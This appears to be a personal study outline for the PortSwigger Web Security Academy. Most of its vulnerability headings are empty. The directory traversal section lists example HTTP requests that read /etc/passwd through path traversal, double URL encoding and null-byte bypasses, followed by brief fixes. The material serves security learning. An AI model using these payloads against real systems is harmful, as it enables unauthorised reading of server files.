# PortSwigger Web Academy

- [PortSwigger Web Academy](#portswigger-web-academy)
  - [SQL Injection](#sql-injection)
  - [Authentication](#authentication)
  - [Directory Traversal](#directory-traversal)
    - [Summary](#summary)
    - [Fix](#fix)
  - [Command Injection](#command-injection)
  - [Business Logic Vulnerabilities](#business-logic-vulnerabilities)
  - [Information Disclosure](#information-disclosure)
  - [Access Control](#access-control)
  - [File Upload Vulnerabilities](#file-upload-vulnerabilities)
  - [Server-Side Request Forgery SSRF](#server-side-request-forgery-ssrf)
  - [XXE Injection](#xxe-injection)
  - [Cross Site Scripting XXS](#cross-site-scripting-xxs)
  - [Cross Site Request Forgery CSRF](#cross-site-request-forgery-csrf)
  - [Cross Origin Resource Sharing CORS](#cross-origin-resource-sharing-cors)
  - [Clickjacking](#clickjacking)
  - [DOM Based Vulnerabilities](#dom-based-vulnerabilities)
  - [WebSockets](#websockets)
  - [Insecure Deserialization](#insecure-deserialization)
  - [Server Side Template Injection SSTI](#server-side-template-injection-ssti)
  - [Web Cache Poisoning](#web-cache-poisoning)
  - [HTTP Host Header Attacks](#http-host-header-attacks)
  - [HTTP Request Smuggling](#http-request-smuggling)
  - [OAuth Authentication](#oauth-authentication)
  - [JWT Attack](#jwt-attack)
  - [Prototype Pollution](#prototype-pollution)

## SQL Injection

## Authentication

## Directory Traversal

<https://portswigger.net/web-security/file-path-traversal>

### Summary

Directory traversal (also known as file path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application.

<https://gchq.github.io/CyberChef/>

```bash
# Most basic case
GET /image?filename=../../../../../../etc/passwd HTTP/2
GET /image?filename=/etc/passwd HTTP/2

# Simple bypasses
GET /image?filename=//....//....//....//etc//passwd HTTP/2
# Double URL encoding
GET /image?filename=%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd HTTP/2
# Null byte to bypass extension check
GET /image?filename=../../../../../../etc/passwd%00.jpg HTTP/2
```

### Fix

- Validate user input
- Only allow execution from canonical root directory

## Command Injection

## Business Logic Vulnerabilities

## Information Disclosure

## Access Control

## File Upload Vulnerabilities

## Server-Side Request Forgery SSRF

## XXE Injection

## Cross Site Scripting XXS

## Cross Site Request Forgery CSRF

## Cross Origin Resource Sharing CORS

## Clickjacking

## DOM Based Vulnerabilities

## WebSockets

## Insecure Deserialization

## Server Side Template Injection SSTI

## Web Cache Poisoning

## HTTP Host Header Attacks

## HTTP Request Smuggling

## OAuth Authentication

## JWT Attack

## Prototype Pollution
